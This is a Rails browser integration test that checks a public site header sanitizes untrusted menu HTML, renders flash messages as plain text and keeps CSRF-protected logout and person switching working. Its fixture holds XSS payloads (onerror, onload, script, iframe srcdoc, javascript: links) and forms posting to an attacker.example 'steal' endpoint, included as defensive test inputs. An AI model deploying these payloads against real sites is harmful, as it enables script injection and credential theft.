require 'test_helper'

class PublicHeaderSecurityBrowserTest < JavascriptIntegrationTest
  test 'hydration treats flash messages as text and sanitizes an untrusted menu response' do
    payload = '<img src=x onerror="window.headerXss=true"> & <script>window.headerXss=true</script>'
    html = <<~HTML
      <li><a id="personDropdown" href="#" data-bs-toggle="dropdown" aria-expanded="false">
        <span class="person-name" style="position:fixed" onclick="window.headerXss=true">Sanitized menu</span>
      </a></li>
      <script>window.headerXss=true</script>
      <img src=x onerror="window.headerXss=true">
      <svg onload="window.headerXss=true"></svg>
      <math><mtext>Unsafe namespace</mtext></math>
      <iframe srcdoc="<script>parent.headerXss=true</script>"></iframe>
      <a class="external-link" href="https://attacker.example/steal">External</a>
      <a class="script-link" href="javascript:window.headerXss=true">Script</a>
      <a class="redirect-link" href="/en/redirect?url=https://attacker.example">Redirect</a>
      <a class="edit-link" href="/en/people/123/edit">Edit</a>
      <form class="unsafe" method="post" action="https://attacker.example/steal"><button>Steal</button></form>
      <form class="unsafe" method="post" action="/en/visits"><button>Wrong action</button></form>
      <form class="unsafe" method="post" action="javascript:window.headerXss=true"><button>Execute</button></form>
      <form class="person-form" method="post" action="/en/people/123/set_current">
        <input type="hidden" name="authenticity_token" value="review-token">
        <input type="hidden" name="CsrfBootstrap" value="clobbered">
        <button type="submit" formaction="https://attacker.example/steal">Switch person</button>
      </form>
      <div id="CsrfBootstrap">Unknown identifier</div>
    HTML
    stub_header_response(html: html, messages: [
      { type: 'notice', text: payload }, { type: 'alert', text: payload }
    ]) do
      visit '/en/about'
      assert_selector '#public-user-menu .person-name', text: 'Sanitized menu'
      assert_equal payload, find('#public-notices #success').text
      assert_equal payload, find('#public-notices #notice').text
      assert_no_selector '#public-notices img, #public-notices script', visible: :all
      assert_no_selector '#public-user-menu script, #public-user-menu img, #public-user-menu svg, #public-user-menu math, #public-user-menu iframe', visible: :all
      assert_no_selector '#public-user-menu [onclick], #public-user-menu [onerror], #public-user-menu [onload], #public-user-menu [style], #public-user-menu [formaction]', visible: :all
      assert_no_selector '#public-user-menu form.unsafe, #public-user-menu #CsrfBootstrap, #public-user-menu [name="CsrfBootstrap"]', visible: :all
      %w[external-link script-link redirect-link].each do |name|
        assert_nil find("#public-user-menu .#{name}")[:href]
      end
      assert_equal '/en/people/123/edit', URI.parse(find('#public-user-menu .edit-link')[:href]).path
      assert_selector '#public-user-menu .person-form input[name="authenticity_token"][value="review-token"]', visible: :all
      assert_equal false, page.evaluate_script('window.headerXss')

      find('#public-notices #success .btn-close').click
      assert_no_selector '#public-notices #success'
      assert_selector '#public-notices #notice'
    end
  end

  test 'sanitized localized menus support person switching and logout with CSRF protection' do
    original_forgery_protection = ActionController::Base.allow_forgery_protection
    ActionController::Base.allow_forgery_protection = true
    user_login
    visit '/fr/about'

    assert_selector '#public-user-menu #personDropdown', text: 'Sally Mclean'
    assert_no_selector '#public-user-menu [onclick]', visible: :all
    assert_selector '#logout-form input[name="_method"][value="delete"]', visible: :all
    token = find('#logout-form input[name="authenticity_token"]', visible: :all).value
    assert token.present?
    assert_selector '#logout-form button[type="submit"]'

    find('#personDropdown').click
    within '#public-user-menu .dropdown-menu' do
      click_button 'Sally Alternative'
    end
    assert_selector '#public-user-menu #personDropdown', text: 'Sally Alternative'
    assert_selector '#public-notices', text: 'Switched to Sally Alternative'

    click_button I18n.t('common.log_out', locale: :fr)
    assert_no_selector '#personDropdown'
    assert_selector '.header-auth-button', text: I18n.t('common.login', locale: :fr)
    visit '/fr/about'
    assert_no_selector '#personDropdown'
  ensure
    ActionController::Base.allow_forgery_protection = original_forgery_protection
  end

  private

  def stub_header_response(payload)
    script = page.driver.browser.execute_cdp('Page.addScriptToEvaluateOnNewDocument', source: <<~JS).fetch('identifier')
      (() => {
        window.headerXss = false;
        document.cookie = 'has_calculator_session=1; path=/';
        const originalFetch = window.fetch;
        window.fetch = function(input, options) {
          const url = new URL(input instanceof Request ? input.url : input, window.location.href);
          if (url.pathname.endsWith('/session_header')) {
            return Promise.resolve(new Response(JSON.stringify(#{payload.to_json}), {
              status: 200, headers: { 'Content-Type': 'application/json' }
            }));
          }
          return originalFetch.call(this, input, options);
        };
      })();
    JS
    yield
  ensure
    page.driver.browser.execute_cdp('Page.removeScriptToEvaluateOnNewDocument', identifier: script) if script
  end
end
